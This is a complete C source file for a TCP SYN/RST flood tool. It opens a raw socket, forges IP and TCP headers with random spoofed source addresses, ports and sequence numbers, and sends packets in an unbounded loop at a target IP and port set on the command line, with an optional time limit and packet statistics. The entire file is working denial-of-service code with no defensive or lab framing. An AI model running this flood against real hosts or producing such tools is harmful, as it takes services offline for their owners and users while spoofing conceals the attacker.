#include "flood.h"

#include <arpa/inet.h>
#include <errno.h>
#include <getopt.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

static FloodState *g_state = NULL;

static int rand_octet(void)
{
    return rand() % 256;
}

static void sigint_handler(int sig)
{
    (void)sig;
    if (g_state)
        g_state->running = 0;
    const char msg[] = "\n[INFO] Interrupted by user.\n";
    write(STDERR_FILENO, msg, sizeof(msg) - 1);
}

static void print_usage(const char *prog)
{
    fprintf(stderr,
        "Usage: %s -t <ip> -p <port> [-r] [-d <seconds>]\n"
        "  -t  Destination IP          (default: %s)\n"
        "  -p  Destination Port        (default: %d)\n"
        "  -r  Use RST flag            (default: SYN)\n"
        "  -d  Duration in seconds     (default: unlimited)\n"
        "  -h  Show help\n",
        prog, DEFAULT_IP, DEFAULT_PORT);
}

uint16_t rand_port(void)
{
    return (uint16_t)(1024 + rand() % 64511);
}

void rand_ip(char *buf, size_t len)
{
    snprintf(buf, len, "%d.%d.%d.%d",
             rand_octet(), rand_octet(), rand_octet(), rand_octet());
}

int valid_ip(const char *ip)
{
    struct sockaddr_in sa;
    return inet_pton(AF_INET, ip, &sa.sin_addr) == 1;
}

unsigned short checksum(const unsigned short *ptr, int nbytes)
{
    long sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        unsigned short odd = 0;
        *((unsigned char *)&odd) = *(const unsigned char *)ptr;
        sum += odd;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)~sum;
}

int flood_parse_args(int argc, char *argv[], FloodConfig *cfg)
{
    snprintf(cfg->dst_ip, sizeof(cfg->dst_ip), "%s", DEFAULT_IP);
    cfg->dst_port   = DEFAULT_PORT;
    cfg->flag_syn   = 1;
    cfg->flag_rst   = 0;
    cfg->time_limit = 0;

    int opt;
    while ((opt = getopt(argc, argv, "t:p:d:rh")) != -1) {
        switch (opt) {
        case 't':
            snprintf(cfg->dst_ip, sizeof(cfg->dst_ip), "%s", optarg);
            if (!valid_ip(cfg->dst_ip)) {
                fprintf(stderr, "[ERROR] IP invalid: %s\n", optarg);
                return -1;
            }
            break;
        case 'p':
            cfg->dst_port = (uint16_t)strtol(optarg, NULL, 10);
            if (cfg->dst_port < 1) {
                fprintf(stderr, "[ERROR] Port invalid: %s\n", optarg);
                return -1;
            }
            break;
        case 'd':
            cfg->time_limit = (int)strtol(optarg, NULL, 10);
            if (cfg->time_limit <= 0) {
                fprintf(stderr, "[ERROR] Duration invalid: %s\n", optarg);
                return -1;
            }
            break;
        case 'r':
            cfg->flag_rst = 1;
            cfg->flag_syn = 0;
            break;
        case 'h':
            print_usage(argv[0]);
            exit(0);
        default:
            print_usage(argv[0]);
            return -1;
        }
    }
    return 0;
}

int flood_init(FloodContext *ctx, FloodConfig *cfg, FloodState *state)
{
    ctx->cfg   = cfg;
    ctx->state = state;

    ctx->sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if (ctx->sock < 0) {
        fprintf(stderr, "[ERROR] socket: %s — Run as root.\n",
                strerror(errno));
        return -1;
    }

    int one = 1;
    if (setsockopt(ctx->sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        fprintf(stderr, "[ERROR] setsockopt: %s\n", strerror(errno));
        close(ctx->sock);
        return -1;
    }

    g_state = state;
    struct sigaction sa = {0};
    sa.sa_handler = sigint_handler;
    sigemptyset(&sa.sa_mask);
    sigaction(SIGINT, &sa, NULL);

    memset(ctx->datagram, 0, DATAGRAM_SIZE);

    struct iphdr  *iph  = (struct iphdr *)ctx->datagram;
    struct tcphdr *tcph = (struct tcphdr *)(ctx->datagram + sizeof(struct iphdr));

    struct sockaddr_in dst = {0};
    dst.sin_family      = AF_INET;
    dst.sin_addr.s_addr = inet_addr(cfg->dst_ip);

    iph->ihl      = 5;
    iph->version  = 4;
    iph->tos      = 0;
    iph->tot_len  = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->frag_off = 0;
    iph->ttl      = TTL_VALUE;
    iph->protocol = IPPROTO_TCP;
    iph->daddr    = dst.sin_addr.s_addr;

    tcph->dest   = htons(cfg->dst_port);
    tcph->doff   = 5;
    tcph->syn    = cfg->flag_syn;
    tcph->rst    = cfg->flag_rst;
    tcph->window = htons(DEFAULT_WINDOW);

    ctx->psh.dst_addr    = dst.sin_addr.s_addr;
    ctx->psh.placeholder = 0;
    ctx->psh.protocol    = IPPROTO_TCP;
    ctx->psh.tcp_length  = htons(sizeof(struct tcphdr));

    return 0;
}

void flood_run(FloodContext *ctx)
{
    struct iphdr  *iph  = (struct iphdr *)ctx->datagram;
    struct tcphdr *tcph = (struct tcphdr *)(ctx->datagram + sizeof(struct iphdr));

    struct sockaddr_in dst = {0};
    dst.sin_family      = AF_INET;
    dst.sin_addr.s_addr = iph->daddr;

    const time_t start      = time(NULL);
    time_t       last_print = start;

    printf("[INFO] Flood → %s:%d  flag=%s  duration=%s\n",
           ctx->cfg->dst_ip,
           ctx->cfg->dst_port,
           ctx->cfg->flag_rst ? "RST" : "SYN",
           ctx->cfg->time_limit ? "" : "unlimited");

    while (ctx->state->running) {

        time_t now = time(NULL);
        if (ctx->cfg->time_limit > 0 &&
            (now - start) >= ctx->cfg->time_limit) {
            ctx->state->running = 0;
            break;
        }

        char src_ip[16];
        rand_ip(src_ip, sizeof(src_ip));

        iph->saddr = inet_addr(src_ip);
        iph->id    = htons((uint16_t)rand());
        iph->check = 0;
        iph->check = checksum((unsigned short *)ctx->datagram,
                              ntohs(iph->tot_len) / 2);

        tcph->source  = htons(rand_port());
        tcph->seq     = htonl((uint32_t)rand());
        tcph->ack_seq = 0;
        tcph->check   = 0;

        ctx->psh.src_addr = iph->saddr;
        memcpy(&ctx->psh.tcp, tcph, sizeof(struct tcphdr));
        tcph->check = checksum((unsigned short *)&ctx->psh,
                               sizeof(struct pseudo_header));

        if (sendto(ctx->sock, ctx->datagram, ntohs(iph->tot_len), 0,
                   (struct sockaddr *)&dst, sizeof(dst)) < 0) {
            fprintf(stderr, "[ERROR] sendto: %s\n", strerror(errno));
            break;
        }

        ctx->state->packet_count++;

        if (now != last_print) {
            printf("\r[STAT] Packets: %d | Time: %lds   ",
                   (int)ctx->state->packet_count, now - start);
            fflush(stdout);
            last_print = now;
        }
    }

    printf("\n[INFO] Total sent: %d packets in %lds\n",
           (int)ctx->state->packet_count,
           time(NULL) - start);
}

void flood_cleanup(FloodContext *ctx)
{
    close(ctx->sock);
}

int main(int argc, char *argv[])
{
    srand((unsigned)time(NULL) ^ (unsigned)getpid());

    FloodConfig cfg;
    if (flood_parse_args(argc, argv, &cfg) < 0)
        return 1;

    FloodState state = { .running = 1, .packet_count = 0 };

    FloodContext ctx;
    if (flood_init(&ctx, &cfg, &state) < 0)
        return 1;

    flood_run(&ctx);
    flood_cleanup(&ctx);

    return 0;
}